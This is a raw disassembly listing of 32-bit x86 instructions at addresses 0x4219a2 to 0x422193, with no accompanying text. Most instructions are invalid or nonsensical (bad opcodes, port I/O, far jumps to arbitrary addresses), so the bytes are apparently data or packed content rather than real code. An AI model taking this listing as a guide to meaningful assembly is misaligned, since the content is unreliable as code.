  4219a2:	push   DWORD PTR [ebp+0x29]
  4219a5:	jne    0x4219ea
  4219a7:	xchg   ecx,eax
  4219a8:	adc    eax,edx
  4219aa:	out    0xcb,eax
  4219ac:	or     esp,DWORD PTR [ebx]
  4219ae:	cld    
  4219af:	icebp  
  4219b0:	imul   esi,edx,0x2a9283
  4219b6:	add    BYTE PTR [eax],al
  4219b8:	add    BYTE PTR [eax],al
  4219ba:	add    BYTE PTR [eax],al
  4219bc:	pop    edi
  4219bd:	inc    ecx
  4219be:	jne    0x421a3b
  4219c0:	cdq    
  4219c1:	in     eax,0xcb
  4219c3:	out    0x5,eax
  4219c5:	sub    eax,0xecfe0000
  4219ca:	sar    esp,cl
  4219cc:	data16 int3 
  4219ce:	in     eax,dx
  4219cf:	out    0x93,eax
  4219d1:	push   edx
  4219d2:	and    edi,esp
  4219d4:	call   0x1828:0xfcc87713
  4219db:	sub    DWORD PTR [edx+0x6f6922ec],ecx
  4219e1:	xchg   esi,eax
  4219e2:	mov    edi,0x23591123
  4219e7:	jae    0x421982
  4219e9:	cmp    eax,0x13e51223
  4219ee:	sar    bh,0xf7
  4219f1:	in     al,dx
  4219f2:	imul   DWORD PTR [ecx-0x71]
  4219f5:	scas   al,BYTE PTR es:[edi]
  4219f6:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4219f7:	and    edx,DWORD PTR [ecx+0x7a761871]
  4219fd:	sub    DWORD PTR [eax],eax
  4219ff:	mov    edi,DWORD PTR [ecx-0x11b037f3]
  421a05:	arpl   ax,dx
  421a07:	cld    
  421a08:	data16 xor al,0xea
  421a0b:	out    0x5,eax
  421a0d:	loope  0x421a31
  421a0f:	cld    
  421a10:	clc    
  421a11:	push   0xe4e839ac
  421a16:	fistp  WORD PTR [edi-0x5b]
  421a19:	push   esp
  421a1a:	or     eax,0x3e967c4
  421a1f:	mov    DWORD PTR [eax],eax
  421a21:	add    BYTE PTR [eax],al
  421a23:	add    BYTE PTR [eax],al
  421a25:	sub    eax,0x12f8ea02
  421a2a:	xchg   esp,eax
  421a2b:	outs   dx,BYTE PTR ds:[esi]
  421a2c:	add    esi,DWORD PTR [ebp-0x7a]
  421a2f:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  421a30:	hlt    
  421a31:	test   BYTE PTR [esi-0x1a],0x3
  421a35:	jne    0x4219c4
  421a37:	sub    ah,al
  421a39:	cmp    dh,BYTE PTR [edx+0x1b423c71]
  421a3f:	mov    ecx,0xc82a8024
  421a44:	mov    ecx,0xed651ac1
  421a49:	in     eax,dx
  421a4a:	inc    esi
  421a4b:	outs   dx,DWORD PTR ds:[esi]
  421a4c:	add    BYTE PTR [ebp-0x56dbaba4],bl
  421a52:	mov    eax,es:0xc28d6a99
  421a58:	fild   QWORD PTR [edx]
  421a5a:	mov    edx,0x280054e
  421a5f:	out    0x76,eax
  421a61:	ss out 0xc6,al
  421a64:	shr    edi,cl
  421a66:	(bad)
  421a69:	sub    al,BYTE PTR [edi-0x19232cdb]
  421a6f:	mov    ch,0x76
  421a71:	fbld   TBYTE PTR es:[esi+0x3]
  421a75:	jne    0x421a79
  421a77:	imul   esp,edx
  421a7a:	add    ah,bh
  421a7c:	xor    BYTE PTR [esi],0x7
  421a7f:	ins    BYTE PTR es:[edi],dx
  421a80:	inc    ebx
  421a81:	(bad)  
  421a82:	cwde   
  421a83:	popa   
  421a84:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  421a85:	xchg   esi,eax
  421a86:	bnd jno 0x421adb
  421a89:	add    BYTE PTR [eax],al
  421a8b:	add    BYTE PTR [eax],al
  421a8d:	add    ch,ch
  421a8f:	cmp    dh,BYTE PTR [ecx-0x38]
  421a92:	push   esi
  421a93:	out    dx,al
  421a94:	aaa    
  421a95:	sub    al,0x91
  421a97:	mov    esp,esi
  421a99:	add    esi,esi
  421a9b:	inc    edx
  421a9c:	cmp    ch,BYTE PTR [ebp+ebp*8-0x207fd72]
  421aa3:	cmp    edi,edi
  421aa5:	popa   
  421aa6:	jb     0x421a33
  421aa8:	jnp    0x421aaf
  421aaa:	add    eax,0x72e14b8d
  421aaf:	sub    dh,ch
  421ab1:	data16 jns 0x421ab6
  421ab4:	test   BYTE PTR [ecx-0x157738f3],ch
  421aba:	jnp    0x421abc
  421abc:	push   0xffffffed
  421abe:	push   cs
  421abf:	fidiv  DWORD PTR [esi+0x29]
  421ac2:	jns    0x421a76
  421ac4:	out    0x96,eax
  421ac6:	stc    
  421ac7:	sbb    esp,edi
  421ac9:	bound  esp,QWORD PTR [edi-0x7d]
  421acc:	add    ch,ch
  421ace:	jae    0x421adb
  421ad0:	push   ebp
  421ad1:	pop    esi
  421ad2:	or     eax,0x5eb82be6
  421ad7:	dec    esp
  421ad8:	xchg   ecx,ebp
  421ada:	jbe    0x421af5
  421adc:	cmp    DWORD PTR [edx-0x2c],esi
  421adf:	add    ebp,edi
  421ae1:	mov    dh,0x9e
  421ae3:	and    DWORD PTR [ebx-0x76fd8e9f],eax
  421ae9:	out    0x57,eax
  421aeb:	xchg   ebp,eax
  421aec:	and    edx,ecx
  421aee:	jmp    0xb442b1
  421af3:	add    BYTE PTR [eax],al
  421af5:	add    BYTE PTR [eax],al
  421af7:	jp     0x421a7a
  421af9:	inc    esp
  421afa:	lds    ebx,FWORD PTR [esi+0x76e987a8]
  421b00:	lods   al,BYTE PTR ds:[esi]
  421b01:	adc    ebx,DWORD PTR [edi-0x16794872]
  421b07:	jbe    0x421b5b
  421b09:	inc    BYTE PTR [ecx]
  421b0b:	jae    0x421ae1
  421b0d:	mov    edi,0x88ba348e
  421b12:	int3   
  421b13:	xor    eax,0xede90343
  421b18:	mov    ebx,ebp
  421b1a:	push   0x5a
  421b1c:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  421b1d:	push   eax
  421b1e:	aaa    
  421b1f:	repnz xchg ebx,eax
  421b21:	or     eax,DWORD PTR [eax]
  421b23:	mov    WORD PTR [ebx+0x8],fs
  421b26:	add    BYTE PTR [ebx-0xb],ch
  421b29:	xor    bl,0x1c
  421b2c:	add    eax,0x64a8b00
  421b31:	jg     0x421b98
  421b33:	rol    BYTE PTR [ecx+ecx*4],1
  421b36:	inc    ebp
  421b37:	adc    BYTE PTR [ebp+0x66],dl
  421b3a:	push   ss
  421b3b:	stos   BYTE PTR es:[edi],al
  421b3c:	out    0x82,al
  421b3e:	(bad)  
  421b40:	add    al,0x87
  421b42:	fsub   DWORD PTR [ebp+0x42]
  421b45:	hlt    
  421b46:	test   DWORD PTR [edi],edx
  421b48:	jp     0x421b4d
  421b4a:	xor    bl,BYTE PTR [esi+eiz*8]
  421b4d:	mov    es,WORD PTR [ecx]
  421b4f:	int3   
  421b50:	add    al,0x6a
  421b52:	sub    al,BYTE PTR [ecx+0x62]
  421b55:	rcr    BYTE PTR [eax+0x44],1
  421b58:	adc    ecx,DWORD PTR [edx]
  421b5a:	add    BYTE PTR [eax],al
  421b5c:	add    BYTE PTR [eax],al
  421b5e:	add    BYTE PTR [eax],al
  421b60:	pushf  
  421b61:	data16 and al,0x8d
  421b64:	mov    cl,0xc4
  421b66:	push   esp
  421b67:	call   0x420fdb
  421b6c:	and    DWORD PTR [edx-0x30],ecx
  421b6f:	push   eax
  421b70:	inc    ebx
  421b71:	jp     0x421b6b
  421b73:	push   ebx
  421b74:	xor    al,0x65
  421b76:	inc    esp
  421b77:	call   DWORD PTR [ebx-0x78]
  421b7a:	retf   
  421b7b:	push   ecx
  421b7c:	sub    al,0x51
  421b7e:	in     al,0x56
  421b80:	adc    al,0xe5
  421b82:	sti    
  421b83:	push   ebx
  421b84:	shl    DWORD PTR [edx],0xf8
  421b87:	mov    DWORD PTR [ecx],ecx
  421b89:	clc    
  421b8a:	in     al,0x91
  421b8c:	push   ecx
  421b8d:	loop   0x421b8a
  421b8f:	add    BYTE PTR [edi],0x4
  421b92:	jno    0x421b9c
  421b94:	fucomip st,st(3)
  421b96:	fld    DWORD PTR [edi-0x4c18fbb4]
  421b9c:	(bad)  
  421b9d:	mov    DWORD PTR ss:[ebp+0x75],edi
  421ba1:	inc    ebp
  421ba2:	mov    ebx,0x370de7
  421ba7:	add    BYTE PTR [edi+0x57a8cf2],cl
  421bad:	loop   0x421bda
  421baf:	fidivr DWORD PTR [eax+0x29]
  421bb2:	add    BYTE PTR [ecx+0x428cfa3a],cl
  421bb8:	xor    eax,0xd9428cda
  421bbd:	fldcw  WORD PTR [ebp-0x6b61b5e0]
  421bc3:	fwait
  421bc4:	add    BYTE PTR [eax],al
  421bc6:	add    BYTE PTR [eax],al
  421bc8:	add    ch,cl
  421bca:	xor    dl,BYTE PTR [edi+0x47acdaff]
  421bd0:	or     edi,eax
  421bd2:	imul   edx,DWORD PTR [edi-0x75a0013e],0x9cb624d7
  421bdc:	sti    
  421bdd:	call   0x64293448
  421be2:	xchg   ecx,eax
  421be3:	add    eax,DWORD PTR [eax]
  421be5:	lock jmp 0x694f5482
  421beb:	cdq    
  421bec:	aas    
  421bed:	jne    0x421c22
  421bef:	add    al,0x59
  421bf1:	add    BYTE PTR [edi+0x18],bl
  421bf4:	out    0x6f,eax
  421bf6:	mov    eax,ds:0xe9f80003
  421bfb:	xchg   edi,eax
  421bfc:	and    al,0xee
  421bfe:	data16 or BYTE PTR [ecx+0x528ae1c0],cl
  421c05:	imul   edi,DWORD PTR [ebx+edi*1],0x891a8187
  421c0c:	inc    edi
  421c0d:	in     eax,0x92
  421c0f:	mov    bl,0x73
  421c11:	cld    
  421c12:	pusha  
  421c13:	cwde   
  421c14:	gs cld 
  421c16:	jo     0x421bb4
  421c18:	mov    BYTE PTR [eax+0x693f4635],bh
  421c1e:	add    ch,al
  421c20:	sub    bh,BYTE PTR [edx]
  421c22:	add    ah,bh
  421c24:	add    edi,esp
  421c26:	mov    ah,0xce
  421c28:	sub    dl,BYTE PTR [eax+0x20cd17]
  421c2e:	add    BYTE PTR [eax],al
  421c30:	add    BYTE PTR [eax],al
  421c32:	xchg   edx,eax
  421c33:	or     dl,bh
  421c35:	add    esi,DWORD PTR [ebp+0x2a]
  421c38:	add    eax,0x61170a89
  421c3d:	cmp    esi,edi
  421c3f:	cmp    bl,ch
  421c41:	xchg   DWORD PTR [edi+0x17],esp
  421c44:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  421c45:	and    bh,bh
  421c47:	(bad)  
  421c48:	jmp    0x7503:0xf70252b2
  421c4f:	test   DWORD PTR [ecx],ebp
  421c51:	or     al,BYTE PTR [ebp+0x17]
  421c54:	cld    
  421c55:	or     edx,eax
  421c57:	in     al,dx
  421c58:	push   esi
  421c59:	test   BYTE PTR [edx-0x3ce495fe],0x7
  421c60:	fdivr  QWORD PTR fs:[ecx+0x2f846516]
  421c67:	push   es
  421c68:	out    0x96,eax
  421c6a:	mov    DWORD PTR [ebx+ebp*8-0x6155cd45],ebp
  421c71:	call   0x7f37:0x2b9a025a
  421c78:	out    0x3,al
  421c7a:	repnz mov esp,0x14332be2
  421c80:	sub    eax,0xeebced20
  421c85:	and    BYTE PTR [edx+0x69b611fe],dh
  421c8b:	nop
  421c8c:	loop   0x421c1a
  421c8e:	gs stos DWORD PTR es:[edi],eax
  421c90:	mov    dh,0x9a
  421c92:	call   0x0:0x69102
  421c99:	add    BYTE PTR [eax],al
  421c9b:	mov    al,0x2a
  421c9d:	ja     0x421c38
  421c9f:	dec    edx
  421ca0:	push   ss
  421ca1:	dec    DWORD PTR [edi-0x11087d01]
  421ca7:	push   0x7e
  421ca9:	mul    bh
  421cab:	xchg   edx,eax
  421cac:	push   ss
  421cad:	cmps   BYTE PTR gs:[esi],BYTE PTR es:[edi]
  421caf:	jge    0x421cab
  421cb1:	or     ah,bl
  421cb3:	not    DWORD PTR [ebp+0x1]
  421cb6:	push   0x79
  421cb8:	push   DWORD PTR [ebx-0x27]
  421cbb:	jae    0x421c4d
  421cbd:	or     ebp,DWORD PTR [esi+edi*1+0x0]
  421cc1:	dec    edi
  421cc2:	fs gs cli 
  421cc5:	dec    esi
  421cc6:	rcr    DWORD PTR [edi+0x7f],0xff
  421cca:	call   0x724dde48
  421ccf:	mov    esp,0xdeedc609
  421cd4:	or     ch,bh
  421cd6:	and    al,0x85
  421cd8:	mov    eax,DWORD PTR [edx-0xb]
  421cdb:	cmp    BYTE PTR [ecx],al
  421cdd:	sbb    bl,dh
  421cdf:	imul   eax,eax,0xb
  421ce2:	bound  ebp,QWORD PTR [ebp+edi*8-0x7c9ae378]
  421ce9:	pop    edi
  421cea:	loope  0x421d62
  421cec:	jge    0x421d45
  421cee:	fyl2xp1 
  421cf0:	mov    ebp,0xd53bcf73
  421cf5:	jnp    0x421ce0
  421cf7:	jbe    0x421d4b
  421cf9:	(bad)  
  421cfa:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  421cfb:	sar    BYTE PTR [edx+0x2bc6],1
  421d01:	add    BYTE PTR [eax],al
  421d03:	add    BYTE PTR [ecx+0x2],bh
  421d06:	mov    DWORD PTR [ecx-0x4a035086],ebp
  421d0c:	xchg   edx,eax
  421d0d:	std    
  421d0e:	mov    ah,BYTE PTR [ecx-0xa407d92]
  421d14:	sahf   
  421d15:	or     al,BYTE PTR [ebp-0x28f08917]
  421d1b:	repnz mov dh,0xe
  421d1e:	xlat   BYTE PTR ds:[ebx]
  421d1f:	add    BYTE PTR [ebx],bl
  421d21:	ret    
  421d22:	add    BYTE PTR [eax],al
  421d24:	loope  0x421cad
  421d26:	call   0x4f7c95ae
  421d2b:	push   esi
  421d2c:	xlat   BYTE PTR ds:[ebx]
  421d2d:	out    dx,eax
  421d2e:	xchg   DWORD PTR [esi+0x74],eax
  421d31:	mov    DWORD PTR [esp+eax*1+0x63],eax
  421d35:	xchg   DWORD PTR [ecx-0x8],edx
  421d38:	xchg   ebp,eax
  421d39:	dec    edx
  421d3a:	clc    
  421d3b:	test   ebp,edx
  421d3d:	add    eax,DWORD PTR [eax+eax*4-0x7cfffee4]
  421d44:	mov    ch,0x1a
  421d46:	cld    
  421d47:	je     0x421d95
  421d49:	push   0xea498d33
  421d4e:	push   esp
  421d4f:	call   0x421003
  421d54:	fld    TBYTE PTR [ebx+0x59c1242]
  421d5a:	mov    bl,0x46
  421d5c:	fcom   QWORD PTR [eax-0x79]
  421d5f:	(bad)  
  421d60:	ins    BYTE PTR es:[edi],dx
  421d61:	push   0x7a595f14
  421d66:	enter  0xe8,0x0
  421d6a:	add    BYTE PTR [eax],al
  421d6c:	add    BYTE PTR [ecx],bh
  421d6e:	jp     0x421d6c
  421d70:	dec    DWORD PTR [edi-0x43]
  421d73:	or     BYTE PTR [ebp-0x74f292a4],al
  421d79:	pop    edx
  421d7a:	mov    ah,dl
  421d7c:	mov    edx,ecx
  421d7e:	hlt    
  421d7f:	dec    ebp
  421d80:	call   0x3e1198
  421d85:	and    cl,al
  421d87:	jno    0x421dac
  421d89:	pop    ds
  421d8a:	leave  
  421d8b:	sti    
  421d8c:	jmp    0x421d16
  421d8e:	push   0xfffffffe
  421d90:	pop    edx
  421d91:	test   BYTE PTR [ebp+0x18],dl
  421d94:	jne    0x421e0b
  421d96:	xchg   DWORD PTR [ebp+0x6418148d],edi
  421d9c:	push   esp
  421d9d:	jne    0x421e11
  421d9f:	sar    bh,0xf7
  421da2:	jmp    0xa43a059b
  421da7:	add    BYTE PTR [eax],al
  421da9:	lock jmp 0x6730f5d8
  421daf:	sbb    al,0x88
  421db1:	mov    ch,0x1d
  421db3:	sbb    eax,0xbc912d72
  421db8:	pop    es
  421db9:	xor    ebp,edx
  421dbb:	(bad)  
  421dbc:	(bad)  
  421dbd:	out    dx,eax
  421dbe:	out    0x1f,al
  421dc0:	out    0xad,eax
  421dc2:	inc    esp
  421dc3:	sbb    bh,ah
  421dc5:	stc    
  421dc6:	imul   edx,DWORD PTR [edi-0x4596b942],0x41629e5d
  421dd0:	add    eax,DWORD PTR [eax]
  421dd2:	add    BYTE PTR [eax],al
  421dd4:	add    BYTE PTR [eax],al
  421dd6:	jne    0x421dd0
  421dd8:	mov    ah,0x55
  421dda:	(bad)  
  421ddb:	cli    
  421ddc:	sti    
  421ddd:	mov    BYTE PTR [ebx],dh
  421ddf:	sbb    eax,0x69f8e987
  421de4:	xchg   edi,eax
  421de5:	cmp    ebp,esi
  421de7:	icebp  
  421de8:	(bad)  
  421de9:	(bad)  
  421dea:	pop    esp
  421deb:	daa    
  421dec:	mov    bh,0x72
  421dee:	outs   dx,BYTE PTR ds:[esi]
  421def:	in     al,dx
  421df0:	mov    WORD PTR [edi+0x5d],?
  421df3:	add    DWORD PTR [esi+esi*2-0x4080d6cb],edi
  421dfa:	mov    DWORD PTR [ecx+0x297585d3],esi
  421e00:	mov    ebx,0x536b582
  421e05:	sub    DWORD PTR [ebp-0x1e8d93c],0x2d880463
  421e0f:	xor    eax,0x39595b87
  421e14:	mov    ch,0x88
  421e16:	mov    bl,0xc1
  421e18:	adc    eax,0x260272fd
  421e1d:	mov    BYTE PTR [edx],ch
  421e1f:	mov    es,WORD PTR [ebx]
  421e21:	shl    DWORD PTR [edx],1
  421e23:	mov    ah,0xb3
  421e25:	mov    eax,0x88e6fe34
  421e2a:	xchg   ebx,eax
  421e2b:	cli    
  421e2c:	imul   ebx,DWORD PTR [esi+esi*2-0x121c8cfe],0xedb0eac1
  421e37:	mov    ch,0xc2
  421e39:	or     eax,DWORD PTR [eax]
  421e3b:	add    BYTE PTR [eax],al
  421e3d:	add    BYTE PTR [eax],al
  421e3f:	enter  0x5e85,0xe8
  421e43:	les    edi,FWORD PTR [edi-0x5a]
  421e46:	jecxz  0x421e62
  421e48:	sub    BYTE PTR [ebx+0x3],ch
  421e4b:	jne    0x421e00
  421e4d:	xor    DWORD PTR [edi-0x7f14732e],eax
  421e53:	xor    dl,BYTE PTR [ebx]
  421e55:	rol    DWORD PTR [ecx],1
  421e57:	inc    esp
  421e58:	inc    edx
  421e59:	test   al,0x7
  421e5b:	jne    0x421e60
  421e5d:	jbe    0x421e11
  421e5f:	xchg   BYTE PTR [edi+0x5440fc27],al
  421e65:	scas   al,BYTE PTR es:[edi]
  421e66:	add    esi,DWORD PTR [ebp+0x2]
  421e69:	or     eax,0x19b3c0d9
  421e6e:	pop    es
  421e6f:	hlt    
  421e70:	pop    ss
  421e71:	or     dl,BYTE PTR [ecx+0x1cd68777]
  421e77:	xor    al,0xfe
  421e79:	or     al,0x89
  421e7b:	sub    ebp,esi
  421e7d:	add    BYTE PTR [ebx],al
  421e7f:	sbb    ecx,DWORD PTR [ecx-0x3a62f44a]
  421e85:	mov    bl,BYTE PTR [ecx+eiz*4]
  421e88:	into   
  421e89:	es inc eax
  421e8b:	inc    edi
  421e8c:	xchg   DWORD PTR [edx],edi
  421e8e:	sbb    BYTE PTR [esi-0x43219913],0x46
  421e95:	test   eax,0xffaf7503
  421e9a:	sahf   
  421e9b:	rol    DWORD PTR ds:0x2756a84,0x0
  421ea2:	adc    DWORD PTR [eax],eax
  421ea4:	add    BYTE PTR [eax],al
  421ea6:	add    BYTE PTR [eax],al
  421ea8:	pop    esp
  421ea9:	pop    ds
  421eaa:	(bad)  
  421eab:	call   0x6d4e70aa
  421eb0:	add    BYTE PTR [ebx],al
  421eb2:	add    cl,ch
  421eb4:	cmc    
  421eb5:	mov    WORD PTR [ebx],cs
  421eb7:	jmp    0xeaada535
  421ebc:	jbe    0x421ec0
  421ebe:	xor    DWORD PTR [esi+eax*2+0x12],0x2d45f0d
  421ec6:	add    cl,ch
  421ec8:	sti    
  421ec9:	xchg   esp,eax
  421eca:	pop    es
  421ecb:	aaa    
  421ecc:	push   ecx
  421ecd:	shl    dh,1
  421ecf:	(bad)  
  421ed0:	jle    0x421e57
  421ed2:	mov    edi,0xc092de
  421ed7:	jmp    0xe17c9a52
  421edc:	or     dl,dl
  421ede:	push   DWORD PTR [ecx-0x17]
  421ee1:	cmp    eax,0xf2be940
  421ee6:	aam    0x91
  421ee8:	dec    ebx
  421ee9:	pop    ds
  421eea:	cld    
  421eeb:	sahf   
  421eec:	lock (bad) 
  421eee:	sti    
  421eef:	push   0x79
  421ef1:	push   cs
  421ef2:	or     al,0x65
  421ef4:	loop   0x421ef8
  421ef6:	add    cl,ch
  421ef8:	sbb    DWORD PTR [edx-0x79],edx
  421efb:	jmp    0xec432176
  421f00:	sbb    bh,BYTE PTR ds:0x99fbe940
  421f06:	jae    0x421ef1
  421f08:	add    eax,0xe18008
  421f0d:	add    BYTE PTR [eax],al
  421f0f:	add    BYTE PTR [eax],al
  421f11:	std    
  421f12:	adc    DWORD PTR [eax-0x7],esi
  421f15:	jg     0x421eab
  421f17:	cmovle esp,esp
  421f1a:	std    
  421f1b:	out    0x0,eax
  421f1d:	or     edi,ebp
  421f1f:	sti    
  421f20:	jmp    DWORD PTR ds:0x8cffff0a
  421f26:	adc    ah,0x8b
  421f29:	xchg   edi,eax
  421f2a:	jg     0x421f85
  421f2c:	in     al,dx
  421f2d:	test   BYTE PTR [edi+0x7f83ffeb],cl
  421f33:	inc    ecx
  421f34:	lock aas 
  421f36:	lds    esp,FWORD PTR [edx-0x77]
  421f39:	sbb    DWORD PTR [ecx],eax
  421f3b:	mov    al,BYTE PTR [ebp+0x60]
  421f3e:	jg     0x421f7f
  421f40:	push   eax
  421f41:	mov    DWORD PTR [ebx-0x14],0xc2303a33
  421f48:	je     0x421f91
  421f4a:	repz cld 
  421f4c:	add    al,cl
  421f4e:	adc    al,0x4c
  421f50:	dec    ecx
  421f52:	(bad)  
  421f54:	cli    
  421f55:	inc    edi
  421f56:	in     al,dx
  421f57:	sti    
  421f58:	test   ah,bl
  421f5a:	sti    
  421f5b:	sub    DWORD PTR [edx-0x74fffae2],0x59
  421f62:	(bad)  
  421f64:	mov    cl,0x97
  421f66:	inc    edx
  421f67:	call   0xfcd363f7
  421f6c:	(bad)  
  421f6d:	fsubr  QWORD PTR [edi]
  421f6f:	fidiv  DWORD PTR [esi+0x34]
  421f72:	das    
  421f73:	pop    ecx
  421f74:	adc    BYTE PTR [eax],al
  421f76:	add    BYTE PTR [eax],al
  421f78:	add    BYTE PTR [eax],al
  421f7a:	rol    DWORD PTR [esi+0x59],cl
  421f7d:	adc    BYTE PTR [edi-0x237f5313],cl
  421f83:	add    al,0x0
  421f85:	dec    ecx
  421f87:	or     al,ch
  421f89:	pusha  
  421f8a:	dec    eax
  421f8b:	add    eax,0xda598b00
  421f90:	and    eax,0x51898
  421f95:	add    BYTE PTR [edi],ah
  421f97:	inc    edx
  421f98:	call   0x7ce59528
  421f9d:	call   DWORD PTR [edx+0xcddd1a]
  421fa3:	xor    DWORD PTR [ecx],ebx
  421fa5:	scas   eax,DWORD PTR es:[edi]
  421fa6:	cmc    
  421fa7:	sbb    al,BYTE PTR [eax]
  421fa9:	add    BYTE PTR [ebp+0x72ff7c1b],cl
  421faf:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  421fb0:	mov    edi,0x80a9fceb
  421fb5:	jmp    DWORD PTR [edx+0x1a]
  421fb8:	sub    eax,0x8099ee0e
  421fbd:	call   DWORD PTR [edx+0x1a]
  421fc0:	mov    bl,0x8a
  421fc2:	jns    0x421fe5
  421fc4:	mov    bl,0x4f
  421fc6:	dec    ebp
  421fc7:	cmp    eax,0xa53aff7c
  421fcc:	mov    edi,0x56981eeb
  421fd1:	xchg   DWORD PTR [ecx],edi
  421fd3:	fld    QWORD PTR [ebx]
  421fd5:	push   esi
  421fd6:	and    dl,BYTE PTR [edi]
  421fd8:	hlt    
  421fd9:	adc    DWORD PTR [ebp+0x721719],esi
  421fdf:	add    BYTE PTR [eax],al
  421fe1:	add    BYTE PTR [eax],al
  421fe3:	gs inc eax
  421fe5:	mov    WORD PTR [ebx],cs
  421fe7:	or     cl,bh
  421fe9:	or     edi,ebp
  421feb:	push   0x75404789
  421ff0:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  421ff1:	cmp    eax,DWORD PTR [eax-0x2782d247]
  421ff7:	jp     0x421f8a
  421ff9:	mov    bl,0x1
  421ffb:	jne    0x422016
  421ffd:	scas   al,BYTE PTR es:[edi]
  421ffe:	cld    
  421fff:	ret    0x8ca4
  422002:	pop    es
  422003:	fst    st(0)
  422005:	and    al,0xfc
  422007:	retf   0x1b94
  42200a:	xchg   BYTE PTR [eax-0x73],al
  42200d:	cmp    ah,0xba
  422010:	sub    BYTE PTR [esp+edi*8+0x74],bh
  422014:	sbb    DWORD PTR [eax],eax
  422016:	sub    DWORD PTR [eax],0xec045702
  42201c:	aad    0x82
  42201e:	dec    eax
  42201f:	xor    eax,0xfdfddb02
  422024:	aas    
  422025:	mov    edi,0xe702f24a
  42202a:	add    esi,DWORD PTR [eax+eax*2+0x4e]
  42202e:	pop    edi
  42202f:	mov    BYTE PTR [edi],cl
  422031:	xor    eax,0x6312b78b
  422036:	inc    esp
  422037:	jns    0x421fbf
  422039:	aas    
  42203a:	add    esi,DWORD PTR [ebp+0x2]
  42203d:	jb     0x422080
  42203f:	rol    DWORD PTR [edx+0x5e],cl
  422042:	add    al,0x75
  422044:	add    ch,dl
  422046:	inc    ecx
  422047:	add    BYTE PTR [eax],al
  422049:	add    BYTE PTR [eax],al
  42204b:	add    bl,dh
  42204d:	les    edx,FWORD PTR [edx]
  42204f:	aad    0x48
  422051:	mov    bl,0xfd
  422053:	mov    gs,WORD PTR [esi-0x7d]
  422056:	fcomp  QWORD PTR es:[edx+0x2ac39d76]
  42205d:	daa    
  42205e:	int3   
  42205f:	jno    0x422082
  422061:	(bad)  
  422063:	sbb    esi,ebx
  422065:	mov    esi,cs
  422067:	mov    eax,ds:0x91d2954b
  42206c:	cwde   
  42206d:	jnp    0x4220a2
  42206f:	sub    BYTE PTR [eax+0x12dba783],ch
  422075:	mov    al,BYTE PTR [eax-0x72250ee8]
  42207b:	(bad)  
  42207c:	dec    esi
  42207d:	jnp    0x4220aa
  42207f:	sub    ch,ch
  422081:	jns    0x4220e5
  422083:	add    esi,DWORD PTR [ebp+0x2]
  422086:	jmp    0x7503:0x6651ff4c
  42208d:	add    cl,BYTE PTR [edi-0x18fe0b55]
  422093:	jg     0x42208f
  422095:	(bad)  
  422096:	jmp    FWORD PTR [esi+esi*8+0xf]
  42209a:	cld    
  42209b:	jmp    0x732de499
  4220a0:	out    dx,al
  4220a1:	cmp    bh,0xe8
  4220a4:	jbe    0x422029
  4220a6:	(bad)  
  4220a7:	frstor [edx+0x76697f79]
  4220ad:	add    al,BYTE PTR [eax]
  4220af:	je     0x4220b1
  4220b1:	add    BYTE PTR [eax],al
  4220b3:	add    BYTE PTR [eax],al
  4220b5:	xchg   edx,eax
  4220b6:	not    BYTE PTR [ecx+0x72]
  4220b9:	inc    esi
  4220ba:	daa    
  4220bb:	push   esp
  4220bc:	push   0x76
  4220be:	add    cl,BYTE PTR [ecx+0x4a7a92a4]
  4220c4:	cmc    
  4220c5:	sub    DWORD PTR [ebx],eax
  4220c7:	int    0xb8
  4220c9:	jge    0x422128
  4220cb:	jg     0x4220b6
  4220cd:	jbe    0x4220d1
  4220cf:	call   0xfc501296
  4220d4:	jb     0x4220d9
  4220d6:	sbb    bh,dh
  4220d8:	pusha  
  4220d9:	mov    edx,0x49e9fc0d
  4220de:	sbb    BYTE PTR [eax-0x103f06f2],cl
  4220e4:	and    ah,BYTE PTR [ebx-0x6f]
  4220e7:	and    DWORD PTR [edx],esp
  4220e9:	arpl   WORD PTR [edi-0x61b29e3],cx
  4220ef:	mov    dl,BYTE PTR [ecx+0x1d]
  4220f2:	cmp    DWORD PTR [edi-0x7f51aeef],0xffffffe9
  4220f9:	jbe    0x42207c
  4220fb:	mov    edi,0xfeee72e6
  422100:	call   0x99849c7b
  422105:	out    dx,al
  422106:	mov    bh,dh
  422108:	fisubr DWORD PTR [eax-0x59]
  42210b:	ss sbb al,0x65
  42210e:	inc    BYTE PTR [ebp+0x27161]
  422114:	add    BYTE PTR [edi+0x840bcf],dh
  42211a:	add    BYTE PTR [eax],al
  42211c:	add    BYTE PTR [eax],al
  42211e:	dec    esp
  42211f:	push   es
  422120:	add    BYTE PTR [eax],al
  422122:	gs mov esi,0x6f9cfffc
  422128:	xor    eax,0x573404d
  42212d:	push   eax
  42212e:	inc    esp
  42212f:	popa   
  422130:	hlt    
  422131:	jmp    FWORD PTR [ebx]
  422133:	jns    0x422176
  422135:	lock pop ss
  422137:	inc    esi
  422138:	and    al,0x8b
  42213a:	leave  
  42213b:	in     eax,0x85
  42213d:	inc    ecx
  42213e:	mov    esp,0xd7f04178
  422143:	inc    esi
  422144:	sub    BYTE PTR [ebx+0x4185e509],cl
  42214a:	add    BYTE PTR [eax+0x41],bh
  42214d:	in     al,dx
  42214e:	in     eax,0x76
  422150:	je     0x4220dd
  422152:	and    ebp,esp
  422154:	ret    0xf840
  422157:	add    BYTE PTR [edi-0x25d697b3],al
  42215d:	push   fs
  42215f:	mov    BYTE PTR [ecx+eax*2-0xfbe8757],0x95
  422167:	jbe    0x42218d
  422169:	mov    edx,DWORD PTR [ecx-0xe]
  42216c:	jg     0x42212e
  42216e:	cwde   
  42216f:	outs   dx,DWORD PTR ds:[esi]
  422170:	jg     0x42216a
  422172:	mov    edi,0x1c8a8305
  422177:	add    DWORD PTR [eax],eax
  422179:	mov    edx,DWORD PTR [ecx-0xa]
  42217c:	sti    
  42217d:	jo     0x4221eb
  42217f:	fiadd  WORD PTR [ecx-0x7e]
  422182:	add    BYTE PTR [eax],al
  422184:	add    BYTE PTR [eax],al
  422186:	add    ah,bl
  422188:	add    BYTE PTR [edi+0x6cf42c45],al
  42218e:	adc    al,0x4
  422190:	sub    edi,DWORD PTR [esi+0x0]
  422193:	int3   
